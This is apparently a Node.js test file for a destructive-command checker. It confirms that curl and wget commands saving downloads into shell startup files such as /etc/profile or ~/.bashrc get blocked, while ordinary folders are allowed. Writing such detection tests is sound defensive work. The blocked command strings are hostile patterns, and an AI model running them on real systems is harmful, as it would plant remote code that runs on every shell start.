'use strict';

process.env.ZN_STATS = 'off';

// A download saved with a folder option (curl --output-dir, wget -P, curl --create-dirs) into a startup file.
// Only example paths and reserved hosts; nothing is run: only the text is checked.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');

const rule = (cmd) => { const r = checkCommand(cmd); return r.verdict === 'block' ? r.rule.replace('destructive:', '') : 'allow'; };

test('a folder option that reaches a startup file is refused', () => {
  for (const c of [
    'curl --output-dir ../etc -O https://example.test/profile',
    'wget -P ../etc https://example.test/zshenv',
    'wget -P../etc https://example.test/zshenv',
    'wget --directory-prefix=../etc https://example.test/profile',
    'wget --directory-prefix /etc/profile.d https://example.test/x.sh',
    'curl --create-dirs -o ../etc/profile https://example.test/p',
    'curl --output-dir=~ -o .bashrc https://example.test/x',
    'curl --output-dir ~ -o .bashrc https://example.test/x',
    'curl -o /etc/zshenv https://example.test/z',
    'wget -O /etc/zprofile https://example.test/z',
  ]) assert.equal(rule(c), 'rc_download', c);
});

test('a folder option on an ordinary folder is allowed', () => {
  for (const c of [
    'curl --output-dir ./downloads -O https://example.test/f',
    'wget -P out https://example.test/f',
    'wget -P ../build https://example.test/f',
    'curl --create-dirs -o ../build/out.bin https://example.test/f',
    'curl --create-dirs -o out/f https://example.test/f',
    'curl --output-dir ./d -o profile https://example.test/f',
  ]) assert.equal(rule(c), 'allow', c);
});

test('many words and options stay quick', () => {
  const cmd = 'wget ' + '-P x '.repeat(5000) + 'https://example.test/f';
  const t = Date.now();
  rule(cmd);
  assert.ok(Date.now() - t < 2000);
});
